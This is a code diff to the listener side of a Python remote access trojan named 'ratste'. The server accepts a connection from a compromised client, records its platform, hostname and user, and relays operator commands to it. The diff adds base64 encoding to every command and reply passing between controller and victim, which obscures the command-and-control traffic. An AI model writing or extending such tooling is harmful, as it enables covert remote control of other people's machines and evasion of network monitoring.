@@ -26,6 +26,7 @@ __version__ = "1.0.0"
 from platform import python_build
 import socket
 import sys
+import base64
 
 try:
     LHOST = str(sys.argv[1])
@@ -36,6 +37,20 @@ except:
     print 'ratste > using default host (127.0.0.1) and port (7261)' 
     LHOST = '127.0.0.1'
     LPORT = 7261
+
+def encode(plain_message):
+
+    plain_message_bytes = plain_message.encode('ascii')
+    base64_message_bytes = base64.b64encode(plain_message_bytes)
+    base64_message = base64_message_bytes.decode('ascii')
+    return base64_message
+
+def decode(base64_message):
+
+    base64_message_bytes = base64_message.encode('ascii')
+    plain_message_bytes = base64.b64decode(base64_message_bytes)
+    plain_message = plain_message_bytes.decode('ascii')
+    return plain_message
 
 def main():
     
@@ -52,9 +67,9 @@ def main():
 
     conn, _ = s.accept()
 
-    conn.send('client_discovery')
-    clientInfo = conn.recv(4096).rstrip()
-    platform, hostname, user, version, arch = clientInfo.split('|')
+    conn.send(encode('client_discovery'))
+    client_info = decode(conn.recv(4096).rstrip())
+    platform, hostname, user, version, arch = client_info.split('|')
 
     print 'ratste > check-in by {}@{}'.format(user, hostname)
     print 'Platform: {}'.format(platform)
@@ -69,14 +84,14 @@ def main():
             continue
 
         # send command to client
-        conn.send(cmd)
+        conn.send(encode(cmd))
 
         # stop server
         if cmd == 'quit':
             s.close()
             sys.exit(0)
 
-        data = conn.recv(4096)
+        data = decode(conn.recv(4096))
         print data
 
 if __name__ == '__main__':
